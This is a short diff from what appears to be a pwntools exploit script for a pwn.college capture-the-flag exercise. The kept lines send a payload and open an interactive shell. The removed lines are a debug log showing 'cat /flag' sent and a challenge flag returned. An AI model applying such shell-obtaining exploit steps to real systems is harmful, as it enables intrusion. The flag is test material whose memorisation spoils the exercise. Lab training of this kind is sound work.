@@ -79,8 +79,3 @@ p.sendline(payload)
 
 # get shell from the process.
 p.interactive()
-
-# [DEBUG] Sent 0xa bytes:
-#     b'cat /flag\n'
-# [DEBUG] Received 0x3a bytes:
-#     b'pwn.college{kiCR837B-HRcr0ifELA8VLOmZOD.dRDO1QDL0AjN1QzW}\n'
